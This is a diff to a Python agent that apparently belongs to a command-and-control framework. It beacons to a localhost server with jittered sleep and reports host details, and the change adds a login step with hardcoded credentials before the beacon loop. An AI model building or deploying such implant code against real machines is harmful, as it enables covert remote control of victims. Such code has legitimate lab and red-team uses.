@@ -13,6 +13,10 @@ SERVER_URL = "http://localhost:5000"
 BEACON_ENDPOINT = "/beacon"
 RESULT_ENDPOINT = "/result"
 UPLOAD_ENDPOINT = "/upload"
+LOGIN_ENDPOINT = "/login"
+
+username = "agent1"
+password = "pass1"
 
 SLEEP_MIN = 5
 SLEEP_MAX = 10
@@ -47,6 +51,16 @@ def get_system_info():
         "user": getpass.getuser(),
         "os": platform.system() + " " + platform.release()
     }
+
+
+def login():
+    payload = {"username": username, "password": password , "agent_id": AGENT_ID}
+    response = requests.post(SERVER_URL + LOGIN_ENDPOINT,json=payload)
+    if response.status_code == 200:
+        return True
+    else:
+        return False
+
 
 
 def beacon():
@@ -212,16 +226,18 @@ def post_result(result, task_uuid):
 
 
 def main():
+    if not login():
+        print("[!] Agent login failed")
+        return
+
+    print("[+] Agent authenticated")
 
     while True:
-
         beacon()
-
         sleep_time = random.randint(SLEEP_MIN, SLEEP_MAX)
-
         print(f"[+] Sleeping {sleep_time} seconds")
-
         time.sleep(sleep_time)
+
 
 
 if __name__ == "__main__":
